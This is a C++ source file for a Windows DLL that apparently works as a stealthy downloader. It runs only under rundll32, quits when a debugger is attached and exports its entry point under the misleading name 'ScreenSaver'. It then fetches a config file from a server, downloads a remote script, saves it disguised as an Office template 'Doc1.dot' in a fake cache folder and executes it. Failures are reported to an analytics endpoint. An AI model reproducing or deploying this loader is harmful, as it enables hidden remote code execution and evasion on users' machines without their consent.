// SHhost.cpp : DLL 导出的实现。

#include "stdafx.h"
#include "resource.h"
#include "SHhost.h"
#include "dlldatax.h"
#include "XScriptHost.h"
#include "atlstr.h"
#include "tlhelp32.h"
#include "shlobj.h"
#include <time.h>
#include <fstream>
#include "md5.h"

class CSHhostModule : public CAtlDllModuleT< CSHhostModule >
{
public :
	DECLARE_LIBID(LIBID_SHhostLib)
//	DECLARE_REGISTRY_APPID_RESOURCEID(IDR_SHHOST, "{47067FAE-36C3-47A8-88E9-3D5AA425B961}")
};

CSHhostModule _AtlModule;


// DLL 入口点
extern "C" BOOL WINAPI DllMain(HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved)
{
	if (dwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hInstance);
		TCHAR szPath[_MAX_PATH] = {0};
		GetModuleFileName(NULL, szPath, _MAX_PATH);
		LPCTSTR pszNames[] = { _T("rundll32.exe") };
		bool bMatch = false;
		LPTSTR lpszFindName = szPath;
		lpszFindName += (int)_tcslen(szPath);
		while('\\' != *lpszFindName && '\\' != *lpszFindName)
			lpszFindName--;
		lpszFindName++;
		int i = 0;
		for( ; i < sizeof pszNames / sizeof pszNames[0]; i++)
		{
			int n = _tcsnicmp( lpszFindName,  pszNames[i], _tcslen(pszNames[i]));
			if(0 == n)
			{
				bMatch = true;
				break;
			}			
		} 
		if(!bMatch)
			return FALSE;
		if(IsDebugging())
			return FALSE; 
	}

#ifdef _MERGE_PROXYSTUB
    if (!PrxDllMain(hInstance, dwReason, lpReserved))
        return FALSE;
#endif
	hInstance;
    return _AtlModule.DllMain(dwReason, lpReserved); 
}


// 用于确定 DLL 是否可由 OLE 卸载
STDAPI DllCanUnloadNow(void)
{
#ifdef _MERGE_PROXYSTUB
    HRESULT hr = PrxDllCanUnloadNow();
    if (FAILED(hr))
        return hr;
#endif
    return _AtlModule.DllCanUnloadNow();
}


// 返回一个类工厂以创建所请求类型的对象
STDAPI DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID* ppv)
{
#ifdef _MERGE_PROXYSTUB
    if (PrxDllGetClassObject(rclsid, riid, ppv) == S_OK)
        return S_OK;
#endif
    return _AtlModule.DllGetClassObject(rclsid, riid, ppv);
}


// DllRegisterServer - 将项添加到系统注册表
STDAPI DllRegisterServer(void)
{
    // 注册对象、类型库和类型库中的所有接口
    HRESULT hr = _AtlModule.DllRegisterServer();
#ifdef _MERGE_PROXYSTUB
    if (FAILED(hr))
        return hr;
    hr = PrxDllRegisterServer();
#endif
	return hr;
}


// DllUnregisterServer - 将项从系统注册表中移除
STDAPI DllUnregisterServer(void)
{
	HRESULT hr = _AtlModule.DllUnregisterServer();
#ifdef _MERGE_PROXYSTUB
    if (FAILED(hr))
        return hr;
    hr = PrxDllRegisterServer();
    if (FAILED(hr))
        return hr;
    hr = PrxDllUnregisterServer();
#endif
	return hr;
}


void KillProcessTree(DWORD dwProcessID, DWORD dwExceptPID)
{ 
	PROCESSENTRY32 info;
	info.dwSize = sizeof(PROCESSENTRY32 );
	//结束进程句柄
	HANDLE hProcess = NULL;
	DWORD dwParentPID = 0;
	DWORD dwChildPID = 0;
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, dwProcessID);
	if(hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return ;
	}
	// 遍历进程快照，轮流显示每个进程的信息
	BOOL bMore = Process32First(hProcessSnap, &info);


	while( bMore != FALSE)
	{
		// 如果找个父进程句柄是需要关闭的ID，就已经完成查找
		if (dwProcessID == info.th32ParentProcessID)
		{
			dwParentPID = info.th32ParentProcessID;
			dwChildPID = info.th32ProcessID;
			break;
		}
		// 如果找到dwProcessID进程，就只保存父线程ID
		if (dwProcessID == info.th32ProcessID)
		{
			dwParentPID = info.th32ProcessID;
		}
		bMore = Process32Next(hProcessSnap, &info);
	}
	if (dwChildPID)
	{
		// 如果有子线程先结束子线程
		hProcess=OpenProcess(PROCESS_TERMINATE, FALSE, dwChildPID);
		if (NULL == hProcess )
		{
			return ;
		}
		if(dwChildPID != dwExceptPID)
			TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	if (dwParentPID)
	{
		hProcess=OpenProcess(PROCESS_TERMINATE, FALSE, dwParentPID);
		if (NULL == hProcess)
		{
			return ;
		}
		if(dwParentPID != dwExceptPID)
			TerminateProcess(hProcess, 0);
		CloseHandle(hProcessSnap);
	}
}
class CMessageLoop
{
public:
		int Run()
	{
		BOOL bDoIdle = TRUE;
		int nIdleCount = 0;
		BOOL bRet;
		MSG m_msg;
		for(;;)
		{
			while(bDoIdle && !::PeekMessage(&m_msg, NULL, 0, 0, PM_NOREMOVE))
			{
				//if(!OnIdle(nIdleCount++))
					bDoIdle = FALSE;
			}

			bRet = ::GetMessage(&m_msg, NULL, 0, 0);

			if(bRet == -1)
			{
				//ATLTRACE2(atlTraceUI, 0, _T("::GetMessage returned -1 (error)\n"));
				continue;   // error, don't process
			}
			else if(!bRet)
			{
				//ATLTRACE2(atlTraceUI, 0, _T("CMessageLoop::Run - exiting\n"));
				break;   // WM_QUIT, exit message loop
			}

			//if(!PreTranslateMessage(&m_msg))
			{
				::TranslateMessage(&m_msg);
				::DispatchMessage(&m_msg);
			}

			if(IsIdleMessage(&m_msg))
			{
				bDoIdle = TRUE;
				nIdleCount = 0;
			}
		}

		return (int)m_msg.wParam;
	}
	
	static BOOL IsIdleMessage(MSG* pMsg)
	{
		// These messages should NOT cause idle processing
		switch(pMsg->message)
		{
		case WM_MOUSEMOVE:
#ifndef _WIN32_WCE
		case WM_NCMOUSEMOVE:
#endif // !_WIN32_WCE
		case WM_PAINT:
		case 0x0118:	// WM_SYSTIMER (caret blink)
			return FALSE;
		}

		return TRUE;
	}
};

BOOL IsSystemStartup()
{
	BOOL b = (GetTickCount()<5*60*1000) ? TRUE : FALSE;
	return b;
}
std::wstring GetLocalTempDir()
{
	TCHAR szTempDir[_MAX_PATH] = {0};
	SHGetFolderPath(NULL, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, 0, SHGFP_TYPE_CURRENT, szTempDir);
	PathAddBackslash(szTempDir);
	PathAppend(szTempDir, _T("Content.mso\\"));	
	std::wstring t = szTempDir; 
	return  t;
}
BOOL GetLaunchUrl(LPTSTR  lptszPath, LONG l, std::wstring & strMD5)
{
	l;
	HRESULT hr = E_FAIL;
	TCHAR szIniPath[_MAX_PATH] = {0};
	TCHAR szTempDir[_MAX_PATH] = {0};
	SHGetFolderPath(NULL, CSIDL_FLAG_CREATE|CSIDL_INTERNET_CACHE, 0, SHGFP_TYPE_CURRENT, szTempDir);
	PathAddBackslash(szTempDir);
	PathAppend(szTempDir, _T("Content.mso\\"));	
	if(!PathFileExists(szTempDir))
		SHCreateDirectory(NULL, szTempDir);	
	_tcsncpy(szIniPath,szTempDir, _MAX_PATH);
	PathAppend(szIniPath, _T("mso.dat"));
	
	TCHAR szIniUrl[2048] = {0};
	wcscpy(szIniUrl, L"http://127.0.0.1:8080/config/mso.dat");
	hr = URLDownloadToCacheFile (NULL, szIniUrl, szIniPath, _MAX_PATH, 0, 0);
	TSDEBUG4CXX("download url : "<<szIniUrl<<" to "<<szIniPath<<" ,return "<<hr);
	if(SUCCEEDED(hr) && PathFileExists(szIniPath))
	{
		TCHAR szLaunchUrl[2048] = {0};
		GetPrivateProfileString(_T("launch"), _T("url"),_T(""), szLaunchUrl, 2048, szIniPath);
		_tcsncpy(lptszPath, szLaunchUrl, l);
		TCHAR szMD5[64] = {0};
		GetPrivateProfileString(_T("launch"), _T("md5"),_T(""), szMD5, 2048,szIniPath);		
		strMD5 = szMD5;		
		std::transform(strMD5.begin(), strMD5.end(), strMD5.begin(), toupper);
		return TRUE;
	}	
	return FALSE;
}
void SendDownloadLaunchUrlFailedStat(LPCTSTR lpctszEvent, LPCTSTR lpctszParam)
{
	CRegKey key;	
	TCHAR szPID[32] = {0};	
	HRESULT hr =  key.Open(HKEY_CURRENT_USER, _T("SOFTWARE\\ExtIconHandler"), KEY_QUERY_VALUE);
	if(hr == ERROR_SUCCESS)
	{
		DWORD dw = _MAX_PATH;				
		dw = 17;
		key.QueryStringValue(L"PID", szPID, &dw);
		key.Close();
	}
	TCHAR szPath[_MAX_PATH] = {0};
	CStringW url;
	url.Format(L"http://www.google-analytics.com/collect?v=1&tid=UA-42360423-1&cid=%s&t=event&ec=exception&ea=%s&el=%s" ,
		szPID, lpctszEvent, lpctszParam);
	URLDownloadToCacheFile (NULL, url, szPath, _MAX_PATH, 0, 0);			 
}
std::wstring  GetFileMD5(LPCTSTR lpctszFile)
{	
	USES_CONVERSION;
	if(!::PathFileExists(lpctszFile))
		return _T("") ;	
	std::ifstream fs;
	fs.open( CStringA(lpctszFile), ios::in|ios::binary );  
	if(fs.fail())
		return _T("") ;
	MD5 md5(fs);
	std::string strMD5A = md5.toString();
	std::transform(strMD5A.begin(), strMD5A.end(), strMD5A.begin(), toupper);
	std::wstring strMD5 = A2W(strMD5A.c_str());
	return strMD5;
}


//CAppModule _Module;
#if defined(WIN64) || defined(_WIN64)
#pragma comment(linker, "/EXPORT:ScreenSaver=?_si0@@YAXPEAUHWND__@@PEAUHINSTANCE__@@PEA_WH@Z,PRIVATE") 
#else
#pragma comment(linker, "/EXPORT:ScreenSaver=?_si0@@YGXPAUHWND__@@PAUHINSTANCE__@@PA_WH@Z,PRIVATE") 
#pragma comment(linker, "/EXPORT:OpenURL=?_openurl@@YGXPAUHWND__@@PAUHINSTANCE__@@PA_WH@Z,PRIVATE") 
//__declspec(dllexport)
#endif

static BOOL MultiByteToUnicode(const std::string& strSrc, std::basic_string<WCHAR> &strDst)
{
	INT nSrcAnsiLen = 0;
	nSrcAnsiLen = (INT)strSrc.length();
	if(0 == nSrcAnsiLen)
		return TRUE;
	UINT code_page = 936;
	INT nLen = 0;
	nLen = MultiByteToWideChar(code_page,0,strSrc.c_str(),-1,NULL,0);
	if(0 == nLen)
	{
		code_page = 0;
		nLen = MultiByteToWideChar(code_page,0,strSrc.c_str(),-1,NULL,0);
	}
	if(MAX_USERDATA_SIZE < nLen)
		nLen = MAX_USERDATA_SIZE;
	WCHAR szBuf[MAX_USERDATA_SIZE + 1] = {0};
	LPWSTR pszBuf = szBuf;
	INT nResult = 0;
	nResult = MultiByteToWideChar(code_page,0,strSrc.c_str(), -1, pszBuf,nLen);
	if(nResult <= 0 )
		return FALSE;	
	if(pszBuf)
		strDst = pszBuf;
	return TRUE;
}
void CALLBACK _openurl(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
{
	TSAUTO();
	lpCmdLine;
	

	CHAR szUrl[2048] = {0};
	GetPrivateProfileStringA( "InternetShortcut", "URL", "", szUrl, 2048, (LPSTR)lpCmdLine);
	::ShellExecuteA(NULL, "open", szUrl, "", NULL,SW_SHOWNORMAL);
}

void  CALLBACK _si0(	HWND hwnd,	HINSTANCE hinst,	LPTSTR lpCmdLine,	int nCmdShow)
{
	TSAUTO();	
	if (IsDebugging())
	{
		return;
	}
	//
	HWND hWnd = FindWindow(_T("XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745}") ,_T(""));
	if(hWnd)
	{
		DWORD dwProcessID = 0;
		GetWindowThreadProcessId(hWnd, &dwProcessID);
		TSDEBUG4CXX("TerminateProcess hWnd="<<hWnd<<" , dwProcessID="<<dwProcessID<<" ");
		KillProcessTree(dwProcessID, (DWORD)-1);
		//HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessID);
		//TerminateProcess(hProcess, (UINT)-100);
	}
	hWnd = FindWindow(_T("XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745}") ,_T("1"));
	if(hWnd)
	{
		DWORD dwProcessID = 0;
		GetWindowThreadProcessId(hWnd, &dwProcessID);
		TSDEBUG4CXX("TerminateProcess hWnd="<<hWnd<<" , dwProcessID="<<dwProcessID<<" ");
		KillProcessTree(dwProcessID,(DWORD)-1);
		//HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessID);
		//TerminateProcess(hProcess, (UINT)-100);
	}
	//////////////
	HWND hWnd2 = FindWindow(_T("XSH_{B9689BCB-F2B7-4D43-B6B3-6BFB66DB1745}") , _T("0"));
	if(hWnd2)
	{
		TSDEBUG4CXX("exit for hWnd2="<<hWnd2);
		return ;
	}	 
	CoInitialize(NULL);	
	std::wstring strTempDir = GetLocalTempDir();	
	std::wstring strFile = strTempDir + _T("Doc1.dot");		 
 	if(IsSystemStartup())
	{
		//刚开机
	}
	else
	{
		//取launchurl 和md5 
		TCHAR szLaunchUrl[2048] = {0};
		std::wstring strUrlMD5;
		GetLaunchUrl(szLaunchUrl, 2048, strUrlMD5);
		std::wstring strFileMD5 = GetFileMD5(strFile.c_str());
		 
		if(strUrlMD5.length()>0 && (strUrlMD5 == strFileMD5))
		{
			TSDEBUG4CXX("same md5 , load local file : "<<strFileMD5.c_str());
		}
		else
		{
			HRESULT hr = E_FAIL;
			hr = URLDownloadToFile (NULL, szLaunchUrl, (LPWSTR)strFile.c_str(),0,NULL);//NULL, t->bstrUrl, tszPath,0,NULL
			if(SUCCEEDED(hr) && PathFileExists(strFile.c_str()))
			{
				//下载成功		不再管md5是否正确		
			}
			else
			{
				//下载失败，直接退出吧。否则统计不准，更是不可控
				SendDownloadLaunchUrlFailedStat(_T("downloadingfile_failed_Doc1.dot"), PathFindFileName(strFile.c_str()));
				TSDEBUG4CXX("download launch url "<<szLaunchUrl<<" to "<<strFile<<" failed!");
				return ;
			}
		}
	}


	////下成功或是md5一样的情况.... 或是首次开机,都是到这里:	
	
	//_Module.AddMessageLoop(&theLoop);
	HRESULT hr = E_FAIL;
	CComPtr<IClassFactory> spCF;
	DllGetClassObject(*__pobjMap_CXScriptHost->pclsid, IID_IClassFactory,  (LPVOID*)&spCF);
	if(!spCF)
		return ;

	CComPtr<IXScriptHost> spScriptHost;
	hr = spCF->CreateInstance(NULL, IID_IXScriptHost, (void **)&spScriptHost);
	if(SUCCEEDED(hr) && spScriptHost)
	{
		spScriptHost->Load( (BSTR)strFile.c_str(), 0 );
		CComVariant v;
		hr = spScriptHost->Run(&v);
		if(SUCCEEDED(hr))
		{
			CMessageLoop theLoop;
			int nRet = theLoop.Run();
			nRet;
		}
		else
		{
			SendDownloadLaunchUrlFailedStat(_T("downloadingfile_loadfailed_Doc1.dot"), PathFindFileName((LPCTSTR)strFile.c_str())); 
		}
		v.Clear();	
		spScriptHost.Release();
		spCF.Release();
		//TerminateProcess(GetCurrentProcess(), nRet);
	}	
	
	return ;
}
